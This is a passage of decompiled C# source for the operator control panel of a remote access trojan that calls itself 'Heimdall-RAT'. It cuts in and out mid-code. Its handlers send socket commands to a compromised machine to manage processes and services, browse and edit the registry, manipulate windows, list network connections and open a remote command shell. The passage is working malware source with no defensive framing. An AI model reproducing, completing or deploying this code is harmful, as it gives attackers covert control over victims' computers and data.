		SM.get_Items().Clear();
		((Control)SM).set_Enabled(false);
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GetService" + MyProject.Forms.FrmMAINGR.Key);
		((ToolStripItem)ToolStripStatusLabel5).set_Text("Please wait a moment ...");
		((ToolStripItem)ToolStripStatusLabel8).set_Text("");
	}

	private void RefreshServiceToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (SM.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel8).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = SM.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Refresh" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(2).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RefreshToolStripMenuItem5_Click(object sender, EventArgs e)
	{
		TCPC.get_Items().Clear();
		((Control)TCPC).set_Enabled(false);
		Established = 0;
		CloseWait = 0;
		Listen = 0;
		Time_Wait = 0;
		MyProject.Forms.FrmMAINGR.s.Send(sock, "Get Connections");
		((ToolStripItem)ToolStripStatusLabel6).set_Text("Please wait a moment ...");
	}

	private void RefreshToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (KeysName.get_Items().get_Count() != 0)
		{
			string empty = string.Empty;
			empty = RegPath.get_Text().Replace(Conversions.ToString(Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\")), "");
			KeysName.get_Items().Clear();
			ValuesRegName.get_Items().Clear();
			((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
			((Control)KeysName).set_Enabled(false);
			((Control)RegValues).set_Enabled(false);
			((Control)ValuesRegName).set_Enabled(false);
			if (Operators.ConditionalCompareObjectEqual((object)RegPath.get_Text(), Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\"), false))
			{
				KeysName.get_Items().Add("...", 0);
			}
			MyProject.Forms.FrmMAINGR.s.Send(sock, "Enter To Sub Key" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(Conversions.ToString(RegValues.get_SelectedItem())) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(empty));
		}
	}

	private void RefreshToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (ValuesRegName.get_Items().get_Count() != 0)
		{
			string empty = string.Empty;
			empty = RegPath.get_Text().Replace(Conversions.ToString(Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\")), "");
			((Control)ValuesRegName).set_Enabled(false);
			ValuesRegName.get_Items().Clear();
			MyProject.Forms.FrmMAINGR.s.Send(sock, "RefreshValues" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(Conversions.ToString(RegValues.get_SelectedItem())) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(empty));
			((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
		}
	}

	private void RefreshToolStripMenuItem4_Click(object sender, EventArgs e)
	{
		Processlists.get_Items().Clear();
		((Control)Processlists).set_Enabled(false);
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GetProcesses");
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Please wait a moment ...");
		((ToolStripItem)ToolStripStatusLabel2).set_Text("");
		((ToolStripItem)ToolStripStatusLabel4).set_Text("");
	}

	private void RegValues_SelectedIndexChanged(object sender, EventArgs e)
	{
		KeysName.get_Items().Clear();
		ValuesRegName.get_Items().Clear();
		((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
		((Control)KeysName).set_Enabled(false);
		((Control)RegValues).set_Enabled(false);
		((Control)Panel3).set_Enabled(false);
		((Control)ValuesRegName).set_Enabled(false);
		MyProject.Forms.FrmMAINGR.s.Send(sock, "Get Sub Keys Names" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(Conversions.ToString(RegValues.get_SelectedItem())));
	}

	private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = PIIT.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Delete PI" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(0).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		if (AW.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		string text = Interaction.InputBox("Select a new name to Windows!", "Select a new name!", "Heimdall-RAT", -1, -1);
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = AW.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (Operators.CompareString(text, "", false) == 0)
					{
						MyProject.Forms.FrmMAINGR.s.Send(sock, "RenameWindows" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(text));
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, "", false) == 0)
		{
			((ToolStripItem)ToolStripStatusLabel3).set_Text("Please wait a moment ...");
		}
	}

	private object ReReg(bool C)
	{
		object result = default(object);
		try
		{
			string empty = string.Empty;
			if (C)
			{
				empty = RegPath.get_Text().Replace(Conversions.ToString(Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\")), "");
			}
			else
			{
				empty = RegPath.get_Text().Replace(Conversions.ToString(Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\")), "") + KeysName.get_FocusedItem().get_SubItems().get_Item(0)
					.get_Text() + "\\";
				RegPath.set_Text(RegPath.get_Text() + KeysName.get_FocusedItem().get_SubItems().get_Item(0)
					.get_Text() + "\\");
			}
			KeysName.get_Items().Clear();
			ValuesRegName.get_Items().Clear();
			if (Operators.ConditionalCompareObjectEqual(Operators.CompareObjectEqual((object)RegPath.get_Text(), Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\"), false), (object)false, false))
			{
				KeysName.get_Items().Add("...", 0);
			}
			MyProject.Forms.FrmMAINGR.s.Send(sock, "Enter To Sub Key" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(Conversions.ToString(RegValues.get_SelectedItem())) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(empty));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void RestartProcessToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		if (Processlists.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel4).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Processlists.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "RestProcess" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(3).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (SM.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel8).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = SM.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Restart" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(2).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ResumeProcessToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		if (Processlists.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel4).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Processlists.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Reusme" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RefreshToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		PIIT.get_Items().Clear();
		((Control)PIIT).set_Enabled(false);
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GPI" + MyProject.Forms.FrmMAINGR.Key);
		((ToolStripItem)ToolStripStatusLabel9).set_Text("Please wait a moment ...");
	}

	private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (AW.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel3).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = AW.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Show" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(((ToolStripItem)StartToolStripMenuItem1).get_Text(), "Start", false) == 0)
		{
			((ToolStripItem)StartToolStripMenuItem1).set_Image((Image)(object)Resources._1486069726_stop);
			((ToolStripItem)StartToolStripMenuItem1).set_Text("Stop");
			MyProject.Forms.FrmMAINGR.s.Send(sock, "OpenRemoteShell" + MyProject.Forms.FrmMAINGR.Key);
			ResultCMD.set_Text((string)null);
			return;
		}
		((ToolStripItem)StartToolStripMenuItem1).set_Text("Start");
		((ToolStripItem)StartToolStripMenuItem1).set_Image((Image)(object)Resources._1484772428_tool_resume);
		SocketServer s = MyProject.Forms.FrmMAINGR.s;
		int num = sock;
		string key = MyProject.Forms.FrmMAINGR.Key;
		string s2 = "exit";
		s.Send(num, "WirteLines" + key + ENB(ref s2));
		ResultCMD.set_Text((string)null);
	}

	private void StartToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (SM.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel8).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = SM.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Start" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(2).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void PauseToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (SM.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel8).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = SM.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Stop" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(2).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void StringToolStripMenuItem_Click(object sender, EventArgs e)
	{
		C(1, CR: true);
	}

	private void SuspendProcessToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		if (Processlists.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel4).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Processlists.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Suspended" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SystemManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			SocketServer s = MyProject.Forms.FrmMAINGR.s;
			int num = sock;
			string key = MyProject.Forms.FrmMAINGR.Key;
			string s2 = "exit";
			s.Send(num, "WirteLines" + key + ENB(ref s2));
			MyProject.Forms.FrmMAINGR.s.Send(sock, "Abort");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void UnlockXButtonToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (AW.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel3).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = AW.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Unlock" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ValuesRegName_DoubleClick(object sender, EventArgs e)
	{
		int i = default(int);
		if (Operators.CompareString(ValuesRegName.get_FocusedItem().get_SubItems().get_Item(1)
			.get_Text(), "String", false) == 0)
		{
			i = 1;
		}
		else if (Operators.CompareString(ValuesRegName.get_FocusedItem().get_SubItems().get_Item(1)
			.get_Text(), "Expand String", false) == 0)
		{
			i = 2;
		}
		else if (Operators.CompareString(ValuesRegName.get_FocusedItem().get_SubItems().get_Item(1)
			.get_Text(), "Binary", false) == 0)
		{
			i = 3;
		}
		else if (Operators.CompareString(ValuesRegName.get_FocusedItem().get_SubItems().get_Item(1)
			.get_Text(), "DWord", false) == 0)
		{
			i = 4;
		}
		else if (Operators.CompareString(ValuesRegName.get_FocusedItem().get_SubItems().get_Item(1)
			.get_Text(), "Multi-String", false) == 0)
		{
			i = 7;
		}
		else if (Operators.CompareString(ValuesRegName.get_FocusedItem().get_SubItems().get_Item(1)
			.get_Text(), "QWord", false) == 0)
		{
			i = 11;
		}
		C(i, CR: false);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		NewTGR newTGR = new NewTGR();
		newTGR.sock = sock;
		((Form)newTGR).set_Text(((Form)this).get_Text().Replace("System Manager", "Create Task"));
		((Form)newTGR).ShowDialog();
	}

	private void CopyPathToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		if (Processlists.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Processlists.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					Clipboard.SetText(val.get_SubItems().get_Item(3).get_Text());
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			((ToolStripItem)ToolStripStatusLabel4).set_Text("Process Path Copied successfully ");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Processlists_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(Processlists.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = Processlists.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			Processlists.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			Processlists.Sort();
		}
	}

	private void SM_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(SM.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = SM.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			SM.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			SM.Sort();
		}
	}

	private void KeysName_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(KeysName.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = KeysName.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			KeysName.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			KeysName.Sort();
		}
	}

	private void TCPC_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(TCPC.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = TCPC.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			TCPC.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			TCPC.Sort();
		}
	}

	private void AW_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(AW.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = AW.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			AW.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			AW.Sort();
		}
	}

	private void ValuesRegName_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(ValuesRegName.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = ValuesRegName.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			ValuesRegName.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			ValuesRegName.Sort();
		}
	}

	private void PrToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Processlists.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
